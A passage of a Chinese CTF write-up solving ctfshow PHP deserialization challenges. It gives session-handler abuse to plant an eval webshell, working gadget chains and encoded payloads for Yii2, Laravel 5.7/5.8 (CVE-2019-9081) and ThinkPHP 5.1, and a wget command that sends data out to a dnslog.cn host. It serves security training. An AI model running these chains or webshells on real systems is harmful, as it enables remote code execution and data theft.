</code></pre><h3 id=web263 class=headerLink><a href=#web263 class=header-mark></a>web263</h3><p>/inc/inc.php 中的 User 类有一处 file_put_contents()</p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411192123027.png title=image.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411192123027.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411192123027.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411192123027.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411192123027.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411192123027.png 2x" sizes=auto alt=image.png></a></figure>文件开头<figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411192126378.png title=image.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411192126378.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411192126378.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411192126378.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411192126378.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411192126378.png 2x" sizes=auto alt=image.png></a></figure></p><p>考点应该是 session 反序列化漏洞</p><p>不过找了一遍发现并没有 <code>unserialize()</code>, 如果想要反序列化的话, 那就得用到 <code>session.serialize_handler</code> 之间的差异性<figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411192126162.png title=image.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411192126162.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411192126162.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411192126162.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411192126162.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411192126162.png 2x" sizes=auto alt=image.png></a></figure>不过并不知道 php.ini 默认使用的 handler 是什么
但因为 inc.php 里显式的设置了 php 这个 handler, 可以大胆猜测一下默认的是 php_serialize</p><p>也就是说 index.php 使用 php_serialize handler 序列化我们传入的 cookie 值, 生成对应的 session 文件</p><p>而 inc.php 里使用 php handler 反序列化 session 文件</p><p>我们利用 php handler 中的 <code>|</code> 来进行反序列化</p><pre tabindex=0><code>&lt;?php

class User{
    public $username;
    public $password;
    function __construct(){
        $this-&gt;username = &#39;123.php&#39;;
        $this-&gt;password = &#39;&lt;?php eval($_POST[1]);?&gt;&#39;;
    }
}

echo base64_encode(&#39;|&#39;.serialize(new User()));


//fE86NDoiVXNlciI6Mjp7czo4OiJ1c2VybmFtZSI7czo3OiIxMjMucGhwIjtzOjg6InBhc3N3b3JkIjtzOjI0OiI8P3BocCBldmFsKCRfUE9TVFsxXSk7Pz4iO30=
</code></pre><p>在前面加上 <code>|</code>, 这样的话 session 反序列化的时候 php handler 会默认把 <code>|</code> 前面的内容当做 key, 不会解析, <code>|</code> 后面的才是真正应该反序列化的 value</p><p>首先第一次访问 index.php, 得到 PHPSESSID
<code>PHPSESSID=ti15gb2rr0op27vae8j814st69;</code></p><p>然后第二次访问 index.php, 在 cookie 中添加这个 PHPSESSID, 并且修改 limit 的值 (注意要将 <code>=</code> urlencode)<figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411192136785.png title=image.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411192136785.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411192136785.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411192136785.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411192136785.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411192136785.png 2x" sizes=auto alt=image.png></a></figure></p><p>最后访问 check.php (check.php 中引用了 /inc/inc.php)<figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411192135047.png title=image.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411192135047.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411192135047.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411192135047.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411192135047.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411192135047.png 2x" sizes=auto alt=image.png></a></figure></p><p>访问 log-123.php，get shell</p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411192134702.png title=image.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411192134702.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411192134702.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411192134702.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411192134702.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411192134702.png 2x" sizes=auto alt=image.png></a></figure></p><h3 id=web264 class=headerLink><a href=#web264 class=header-mark></a>web264</h3><p>同web262，只是修复了非预期解</p><h3 id=web265 class=headerLink><a href=#web265 class=header-mark></a>web265</h3><p>反序列化后 token 重新赋值, md5 加密的随机数
如果想要得到 flag 的话, password 必须跟 token 一模一样
想到了 PHP 中变量的引用 <code>&</code></p><p><code>&</code> 传递变量的地址, 类似于 c 中的指针</p><pre tabindex=0><code>&lt;?php

$a = &#39;123&#39;;
$b = &amp;$a;
$a = &#39;456&#39;;
echo $b;

//456
</code></pre><p>这里面 <code>$b</code> 的值就是 <code>$a</code> 的值, 因为 <code>$b</code> 里面存了 <code>$a</code> 的地址, 两者是等价的。同理, 如果改变 <code>$b</code> 的值, <code>$a</code> 的值也同样会改变</p><pre tabindex=0><code>&lt;?php

class ctfshowAdmin{
    public $token;
    public $password;

    function __construct(){
        $this-&gt;password = &amp;$this-&gt;token;
    }
}

echo serialize(new ctfshowAdmin());
</code></pre><p>可以看到这里面 password 后的字符是 <code>R</code>, 代表引用 (Reference)
get 传参后得到 flag</p><h3 id=web266 class=headerLink><a href=#web266 class=header-mark></a>web266</h3><p><code>__destruct()</code> 在对象被销毁时会自动调用，我们只需要让 ctfshow 类正确被反序列化即可，但是直接传 ctfshow 会被检测，之后就会抛出异常，如果程序报错或者抛出异常就不会触发 <code>__destruct()</code> 了，因为 throw 那个函数回收了自动销毁的类，导致 <code>__destruct()</code> 检测不到有东西销毁，从而也就无法触发 <code>__destruct()</code></p><p>这里 ctfshow 正则匹配没有 i ，可以大小写绕过</p><pre tabindex=0><code>&lt;?php
class CTFSHOW
{
    public $username = &#39;xxxxxx&#39;;
    public $password = &#39;xxxxxx&#39;;
}
$c = new Ctfshow();
echo serialize($c);
</code></pre><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412091441244.png title=image.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412091441244.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412091441244.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412091441244.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412091441244.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412091441244.png 2x" sizes=auto alt=image.png></a></figure></p><h3 id=web267 class=headerLink><a href=#web267 class=header-mark></a>web267</h3><p>先搜集一下信息
主页面进入源代码。发现是Yii框架，版本为2.0
Login 页面试试用户名密码发现是 admin admin</p><p>About 页面提示<figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412092121382.png title=image.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412092121382.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412092121382.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412092121382.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412092121382.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412092121382.png 2x" sizes=auto alt=image.png></a></figure></p><p><code>/index.php?r=site%2Fabout&amp;view-source</code> 发现提示</p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412092122936.png title=image.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412092122936.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412092122936.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412092122936.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412092122936.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412092122936.png 2x" sizes=auto alt=image.png></a></figure>直接给exp，适用于Yii2 2.0.38 之前的版本</p><pre tabindex=0><code>&lt;?php
namespace yii\rest{
    class CreateAction{
        public $checkAccess;
        public $id;
 
        public function __construct(){
            $this-&gt;checkAccess = &#39;passthru&#39;;
            $this-&gt;id = &#39;tac /flag&#39;;
        }
    }
}
 
namespace Faker{
    use yii\rest\CreateAction;
 
    class Generator{
        protected $formatters;
 
        public function __construct(){
            $this-&gt;formatters[&#39;close&#39;] = [new CreateAction(), &#39;run&#39;];
        }
    }
}
 
namespace yii\db{
    use Faker\Generator;
 
    class BatchQueryResult{
        private $_dataReader;
 
        public function __construct(){
            $this-&gt;_dataReader = new Generator;
        }
    }
}
namespace{
    echo base64_encode(serialize(new yii\db\BatchQueryResult));
}
</code></pre><p>payload:</p><pre tabindex=0><code>?r=/backdoor/shell&amp;code=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoxMToiY2hlY2tBY2Nlc3MiO3M6ODoicGFzc3RocnUiO3M6MjoiaWQiO3M6OToidGFjIC9mbGFnIjt9aToxO3M6MzoicnVuIjt9fX19
</code></pre><h3 id=web268 class=headerLink><a href=#web268 class=header-mark></a>web268</h3><p>补充：上一题传入如下命令，进行 DNS 外带发现网站目录为 <code>/var/www/html/basic/web1.php</code></p><pre tabindex=0><code>shell_exec(wget `pwd|base64`.ha0qmv.dnslog.cn)
</code></pre><p>发现页面和上一题一样，用上一题 payload 发现没有回显，想到写马进去</p><pre tabindex=0><code>&lt;?php  
namespace yii\rest {  
    class Action  
    {  
        public $checkAccess;  
    }  
    class IndexAction  
    {  
        public function __construct($func, $param)  
        {  
            $this-&gt;checkAccess = $func;  
            $this-&gt;id = $param;  
        }  
    }  
}  
namespace yii\web {  
    abstract class MultiFieldSession  
    {  
        public $writeCallback;  
    }  
    class DbSession extends MultiFieldSession  
    {  
        public function __construct($func, $param)  
        {  
            $this-&gt;writeCallback = [new \yii\rest\IndexAction($func, $param), &#34;run&#34;];  
        }  
    }  
}  
namespace yii\db {  
    use yii\base\BaseObject;  
    class BatchQueryResult  
    {  
        private $_dataReader;  
        public function __construct($func, $param)  
        {  
            $this-&gt;_dataReader = new \yii\web\DbSession($func, $param);  
        }  
    }  
}  
namespace {  
    $exp = new \yii\db\BatchQueryResult(&#39;shell_exec&#39;, &#39;echo &#34;&lt;?php eval(\$_POST[1]);phpinfo();?&gt;&#34; &gt;/var/www/html/basic/web/1.php&#39;);  
    echo(base64_encode(serialize($exp)));  
}
</code></pre><p>payload:</p><pre tabindex=0><code>?r=/backdoor/shell&amp;code=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNzoieWlpXHdlYlxEYlNlc3Npb24iOjE6e3M6MTM6IndyaXRlQ2FsbGJhY2siO2E6Mjp7aTowO086MjA6InlpaVxyZXN0XEluZGV4QWN0aW9uIjoyOntzOjExOiJjaGVja0FjY2VzcyI7czoxMDoic2hlbGxfZXhlYyI7czoyOiJpZCI7czo3MzoiZWNobyAiPD9waHAgZXZhbChcJF9QT1NUWzFdKTtwaHBpbmZvKCk7Pz4iID4vdmFyL3d3dy9odG1sL2Jhc2ljL3dlYi8xLnBocCI7fWk6MTtzOjM6InJ1biI7fX19
</code></pre><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412092156773.png title=image.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412092156773.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412092156773.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412092156773.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412092156773.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412092156773.png 2x" sizes=auto alt=image.png></a></figure></p><h3 id=web269 class=headerLink><a href=#web269 class=header-mark></a>web269</h3><p>同上一题</p><h3 id=web270 class=headerLink><a href=#web270 class=header-mark></a>web270</h3><p>同上一题</p><h3 id=web271 class=headerLink><a href=#web271 class=header-mark></a>web271</h3><p>laravel 5.7（CVE-2019-9081）
poc:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>namespace</span> <span class=nx>Illuminate\Foundation\Testing</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>use</span> <span class=nx>Illuminate\Auth\GenericUser</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>use</span> <span class=nx>Illuminate\Foundation\Application</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>class</span> <span class=nc>PendingCommand</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>protected</span> <span class=nv>$command</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>protected</span> <span class=nv>$parameters</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>public</span> <span class=nv>$test</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>protected</span> <span class=nv>$app</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>command</span><span class=o>=</span><span class=s2>&#34;system&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>parameters</span><span class=p>[]</span><span class=o>=</span><span class=s2>&#34;cat /flag&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>test</span><span class=o>=</span><span class=k>new</span> <span class=nx>GenericUser</span><span class=p>();</span>
</span></span><span class=line><span class=cl>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>app</span><span class=o>=</span><span class=k>new</span> <span class=nx>Application</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>namespace</span> <span class=nx>Illuminate\Foundation</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>class</span> <span class=nc>Application</span><span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>protected</span> <span class=nv>$bindings</span> <span class=o>=</span> <span class=p>[];</span>
</span></span><span class=line><span class=cl>        <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>bindings</span><span class=o>=</span><span class=k>array</span><span class=p>(</span>
</span></span><span class=line><span class=cl>                <span class=s1>&#39;Illuminate\Contracts\Console\Kernel&#39;</span><span class=o>=&gt;</span><span class=k>array</span><span class=p>(</span>
</span></span><span class=line><span class=cl>                    <span class=s1>&#39;concrete&#39;</span><span class=o>=&gt;</span><span class=s1>&#39;Illuminate\Foundation\Application&#39;</span>
</span></span><span class=line><span class=cl>                <span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>namespace</span> <span class=nx>Illuminate\Auth</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>class</span> <span class=nc>GenericUser</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>protected</span> <span class=nv>$attributes</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>attributes</span><span class=p>[</span><span class=s1>&#39;expectedOutput&#39;</span><span class=p>]</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;hello&#39;</span><span class=p>,</span><span class=s1>&#39;world&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>attributes</span><span class=p>[</span><span class=s1>&#39;expectedQuestions&#39;</span><span class=p>]</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;hello&#39;</span><span class=p>,</span><span class=s1>&#39;world&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>namespace</span><span class=p>{</span>
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl>    <span class=k>use</span> <span class=nx>Illuminate\Foundation\Testing\PendingCommand</span><span class=p>;</span>
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=nx>urlencode</span><span class=p>(</span><span class=nx>serialize</span><span class=p>(</span><span class=k>new</span> <span class=nx>PendingCommand</span><span class=p>()));</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>payload:</p><pre tabindex=0><code>data=O%3A44%3A%22Illuminate%5CFoundation%5CTesting%5CPendingCommand%22%3A4%3A%7Bs%3A10%3A%22%00%2A%00command%22%3Bs%3A6%3A%22system%22%3Bs%3A13%3A%22%00%2A%00parameters%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A9%3A%22cat+%2Fflag%22%3B%7Ds%3A4%3A%22test%22%3BO%3A27%3A%22Illuminate%5CAuth%5CGenericUser%22%3A1%3A%7Bs%3A13%3A%22%00%2A%00attributes%22%3Ba%3A2%3A%7Bs%3A14%3A%22expectedOutput%22%3Ba%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22hello%22%3Bi%3A1%3Bs%3A5%3A%22world%22%3B%7Ds%3A17%3A%22expectedQuestions%22%3Ba%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22hello%22%3Bi%3A1%3Bs%3A5%3A%22world%22%3B%7D%7D%7Ds%3A6%3A%22%00%2A%00app%22%3BO%3A33%3A%22Illuminate%5CFoundation%5CApplication%22%3A1%3A%7Bs%3A11%3A%22%00%2A%00bindings%22%3Ba%3A1%3A%7Bs%3A35%3A%22Illuminate%5CContracts%5CConsole%5CKernel%22%3Ba%3A1%3A%7Bs%3A8%3A%22concrete%22%3Bs%3A33%3A%22Illuminate%5CFoundation%5CApplication%22%3B%7D%7D%7D%7D
</code></pre><h3 id=web272 class=headerLink><a href=#web272 class=header-mark></a>web272</h3><p>Laravel 5.8（CVE-2019-9081）
poc:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>namespace</span> <span class=nx>Illuminate\Broadcasting</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>use</span> <span class=nx>Illuminate\Bus\Dispatcher</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>use</span> <span class=nx>Illuminate\Foundation\Console\QueuedCommand</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>class</span> <span class=nc>PendingBroadcast</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>protected</span> <span class=nv>$events</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>protected</span> <span class=nv>$event</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>events</span><span class=o>=</span><span class=k>new</span> <span class=nx>Dispatcher</span><span class=p>();</span>
</span></span><span class=line><span class=cl>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>event</span><span class=o>=</span><span class=k>new</span> <span class=nx>QueuedCommand</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>namespace</span> <span class=nx>Illuminate\Foundation\Console</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>class</span> <span class=nc>QueuedCommand</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>public</span> <span class=nv>$connection</span><span class=o>=</span><span class=s2>&#34;cat /flag&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>namespace</span> <span class=nx>Illuminate\Bus</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>class</span> <span class=nc>Dispatcher</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>protected</span> <span class=nv>$queueResolver</span><span class=o>=</span><span class=s2>&#34;system&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>namespace</span><span class=p>{</span>
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl>    <span class=k>use</span> <span class=nx>Illuminate\Broadcasting\PendingBroadcast</span><span class=p>;</span>
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=nx>urlencode</span><span class=p>(</span><span class=nx>serialize</span><span class=p>(</span><span class=k>new</span> <span class=nx>PendingBroadcast</span><span class=p>()));</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>payload:</p><pre tabindex=0><code>data=O%3A40%3A%22Illuminate%5CBroadcasting%5CPendingBroadcast%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00events%22%3BO%3A25%3A%22Illuminate%5CBus%5CDispatcher%22%3A1%3A%7Bs%3A16%3A%22%00%2A%00queueResolver%22%3Bs%3A6%3A%22system%22%3B%7Ds%3A8%3A%22%00%2A%00event%22%3BO%3A43%3A%22Illuminate%5CFoundation%5CConsole%5CQueuedCommand%22%3A1%3A%7Bs%3A10%3A%22connection%22%3Bs%3A9%3A%22cat+%2Fflag%22%3B%7D%7D
</code></pre><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412101106024.png title=image.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412101106024.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412101106024.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412101106024.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412101106024.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412101106024.png 2x" sizes=auto alt=image.png></a></figure>flag在源代码里<figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412101107799.png title=image.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412101107799.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412101107799.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412101107799.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412101107799.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412101107799.png 2x" sizes=auto alt=image.png></a></figure></p><h3 id=web273 class=headerLink><a href=#web273 class=header-mark></a>web273</h3><p>同上一题</p><h3 id=web274 class=headerLink><a href=#web274 class=header-mark></a>web274</h3><p>ThinkPHP V5.1
F12发现反序列化入口<figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412101109021.png title=image.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412101109021.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412101109021.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412101109021.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412101109021.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412101109021.png 2x" sizes=auto alt=image.png></a></figure>exp:</p><pre tabindex=0><code>&lt;?php
namespace think;
 
abstract class Model{
    protected $append = [];
    private $data = [];
    public function __construct()
    {
        $this-&gt;append = [&#34;li&#34;=&gt;[]];
        $this-&gt;data = [&#34;li&#34;=&gt;new Request()];
    }
}
namespace think\process\pipes;
use think\model\Pivot;
class Windows{
    private $files = [];
    public function __construct()
    {
        $this-&gt;files = [new Pivot()];
    }
}
namespace think\model;
use think\model;
class Pivot extends Model{
 
}
namespace think;
class Request{
    protected $hook = [];
    protected $filter;
    protected $config;
    protected $param = [];
    public function __construct()
    {
        $this-&gt;hook = [&#34;visible&#34;=&gt;[$this,&#34;isAjax&#34;]];
        $this-&gt;filter = &#39;system&#39;;
        $this-&gt;config = [&#34;var_ajax&#34;=&gt;&#39;&#39;];
        $this-&gt;param = [&#39;cat /f*&#39;];
    }
}
use think\process\pipes\Windows;
echo base64_encode(serialize(new Windows()));
?&gt;
</code></pre><p>payload:</p><pre tabindex=0><code>&lt;?php
namespace think;
 
abstract class Model{
    protected $append = [];
    private $data = [];
    public function __construct()
    {
        $this-&gt;append = [&#34;li&#34;=&gt;[]];
        $this-&gt;data = [&#34;li&#34;=&gt;new Request()];
    }
}
namespace think\process\pipes;
use think\model\Pivot;
class Windows{
    private $files = [];
    public function __construct()
    {
        $this-&gt;files = [new Pivot()];
    }
}
namespace think\model;
use think\model;
class Pivot extends Model{
 
}
namespace think;
class Request{
    protected $hook = [];
    protected $filter;
    protected $config;
    protected $param = [];
    public function __construct()
    {
        $this-&gt;hook = [&#34;visible&#34;=&gt;[$this,&#34;isAjax&#34;]];
        $this-&gt;filter = &#39;system&#39;;
        $this-&gt;config = [&#34;var_ajax&#34;=&gt;&#39;&#39;];
        $this-&gt;param = [&#39;cat /f*&#39;];
    }
}
use think\process\pipes\Windows;
echo base64_encode(serialize(new Windows()));
?&gt;
</code></pre><h3 id=web275 class=headerLink><a href=#web275 class=header-mark></a>web275</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm># -*- coding: utf-8 -*-
</span></span></span><span class=line><span class=cl><span class=cm># @Author: h1xa
</span></span></span><span class=line><span class=cl><span class=cm># @Date:   2020-12-08 19:13:36
</span></span></span><span class=line><span class=cl><span class=cm># @Last Modified by:   h1xa
